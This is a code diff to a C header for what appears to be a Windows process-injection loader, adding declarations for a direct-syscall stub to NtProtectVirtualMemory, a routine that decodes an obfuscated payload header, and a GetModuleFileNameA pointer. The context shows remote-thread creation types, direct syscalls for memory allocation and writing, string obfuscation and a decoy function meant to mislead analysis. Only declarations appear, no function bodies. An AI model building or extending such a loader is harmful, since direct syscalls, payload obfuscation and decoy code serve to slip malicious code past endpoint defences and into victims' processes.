@@ -29,6 +29,7 @@ typedef HMODULE(WINAPI *pMod)(LPCSTR);
 typedef FARPROC(WINAPI *pModC)(HMODULE, LPCSTR);
 typedef HANDLE(WINAPI *pCRT_t)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD); //Remote Threads
 typedef BOOL(WINAPI *pCPA_t)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION); //CreatProcessA
+typedef DWORD(WINAPI *pGetModuleFileNameA_t)(HMODULE, LPSTR, DWORD);
 typedef HANDLE(WINAPI *pCreateFileA_t)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
 typedef DWORD(WINAPI *pGetFileSize_t)(HANDLE, LPDWORD);
 typedef DWORD(WINAPI *pWaitForSingleObject_t)(HANDLE, LPDWORD);
@@ -43,13 +44,20 @@ typedef HANDLE(WINAPI *pFindFirstFileA_t)(LPCSTR, LPWIN32_FIND_DATAA); // FindFi
 typedef BOOL(WINAPI *pQueryPerformance_t)(LARGE_INTEGER*); //for QueryPerformanceFrequency and QueryPerformanceCounter
 
 /*
-Headers of assembly functions for direct syscalls.
-See definitions in syscalls.asm.
+Headers of assembly functions for direct syscalls. See definitions in syscalls.asm.
 CustAVM: NtAllocateVirtualMemory
-CustWVM: NtWriteVirtualMemory
 */
 extern NTSTATUS CustAVM(HANDLE hProcess, PVOID *BaseAddress, ULONG ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect); 
+/*
+Headers of assembly functions for direct syscalls. See definitions in syscalls.asm.
+CustWVM: NtWriteVirtualMemory
+*/
 extern NTSTATUS CustWVM(HANDLE hProcess, PVOID BaseAddress, PVOID Buffer, SIZE_T BufferSize, PSIZE_T NumberOfBytesWritten);
+/*
+Headers of assembly functions for direct syscalls. See definitions in syscalls.asm.
+CustPVM: NtProtectVirtualMemory
+*/
+extern NTSTATUS CustPVM(HANDLE hProcess, PVOID *BaseAddress, PSIZE_T BufferSize, ULONG NewAccessProtection, PULONG OldAccessProtection);
 
 /**
  *--------------------------------------------------------------------------------------
@@ -59,6 +67,11 @@ extern NTSTATUS CustWVM(HANDLE hProcess, PVOID BaseAddress, PVOID Buffer, SIZE_T
  *--------------------------------------------------------------------------------------
  */
 char *obfs_decode(unsigned char key, char str[]);
+
+/**
+ * Tweak version of obfs_encode for decoding the payload header (encoded)
+ */
+void obfs_decode_binary(unsigned char key, unsigned char *data, size_t len);
 
 /* Decoy function
 This function will generate 1,000 random numbers, sort them, and compute the average.
